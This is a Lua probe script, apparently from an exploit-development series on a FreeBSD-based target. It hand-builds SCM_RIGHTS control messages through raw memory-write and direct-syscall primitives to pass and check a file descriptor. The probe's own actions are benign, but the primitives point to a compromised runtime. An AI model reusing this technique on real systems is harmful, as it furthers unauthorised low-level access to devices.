-- CRASH_CLASS: LOW
-- PROBE 660a: FreeBSD cmsghdr is {u32 len, int level, int type, pad, data}.
-- 659a wrote a Linux-shaped header (len as qword, level at +8) so every
-- control message was rejected. This uses the FreeBSD offsets.
print("=== PROBE 660a: SCM_RIGHTS WITH THE FREEBSD CMSGHDR ===")
local function N(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function U(a) a=N(a) return uint64(string.format("0x%08X%08X",math.floor(a/4294967296),a%4294967296)) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wb(a,v) pcall(function() memory.write_byte(a,v) end) end
local function rd(a) local o,v=pcall(function() return memory.read_qword(a) end) if o then return N(v) end return nil end
local function rdd(a) local o,v=pcall(function() return memory.read_dword(a) end) if o then return N(v) end return nil end
local function z(a,n) for k=0,n-8,8 do wq(N(a)+k,uint64(0)) end end
local sv=memory.alloc(8); z(sv,8)
local r=select(2,pcall(function() return mk(135)(U(1),U(1),U(0),U(N(sv)),U(0),U(0)) end))
local A,B=rdd(N(sv)),rdd(N(sv)+4)
print(string.format("[A] socketpair rv=%s A=%s B=%s",tostring(r),tostring(A),tostring(B)))
local p=memory.alloc(16); for i,c in ipairs({47,100,101,118,47,122,101,114,111,0}) do wb(N(p)+i-1,c) end
local V=N(select(2,pcall(function() return mk(5)(U(N(p)),U(0),U(0),U(0),U(0),U(0)) end)))
print(string.format("[B] open /dev/zero=%s",tostring(V)))
local data=memory.alloc(16); wb(N(data),65)
local iov=memory.alloc(16); wq(N(iov),N(data)); wq(N(iov)+8,1)
local ctl=memory.alloc(64); z(ctl,64)
wd(N(ctl),20); wd(N(ctl)+4,0xFFFF); wd(N(ctl)+8,1); wd(N(ctl)+0x10,V)
local mh=memory.alloc(0x40); z(mh,0x40)
wq(N(mh)+0x10,N(iov)); wq(N(mh)+0x18,1); wq(N(mh)+0x20,N(ctl)); wd(N(mh)+0x28,24)
local s=N(select(2,pcall(function() return mk(28)(U(A),U(N(mh)),U(0),U(0),U(0),U(0)) end)))
print(string.format("[C] sendmsg(SCM_RIGHTS fd=%d) rv=%s",V,tostring(s)))
if s<=0 then print("[X] send failed"); return end
local rb=memory.alloc(16); z(rb,16)
local iov2=memory.alloc(16); wq(N(iov2),N(rb)); wq(N(iov2)+8,1)
local ctl2=memory.alloc(128); z(ctl2,128)
local mh2=memory.alloc(0x40); z(mh2,0x40)
wq(N(mh2)+0x10,N(iov2)); wq(N(mh2)+0x18,1); wq(N(mh2)+0x20,N(ctl2)); wd(N(mh2)+0x28,128)
local rr=N(select(2,pcall(function() return mk(27)(U(B),U(N(mh2)),U(0x80),U(0),U(0),U(0)) end)))
local clen=rdd(N(mh2)+0x28)
print(string.format("[D] recvmsg rv=%s controllen=%s",tostring(rr),tostring(clen)))
local got=rdd(N(ctl2)+0x10)
local lvl=rdd(N(ctl2)+4); local typ=rdd(N(ctl2)+8); local cl=rdd(N(ctl2))
print(string.format("[E] cmsg len=%s level=%X type=%d fd=%s",tostring(cl),lvl or 0,typ or 0,tostring(got)))
if got and got>0 then
  local st=memory.alloc(0x100)
  local fr=select(2,pcall(function() return mk(189)(U(got),U(N(st)),U(0),U(0),U(0),U(0)) end))
  print(string.format("[F] fstat(received %d) rv=%s mode=%X",got,tostring(fr),rdd(N(st)+4) or 0))
end
print(string.format("[Z] alive=%d",N(native.fcall_with_rax(syscall.pipe.fn_addr,20))))
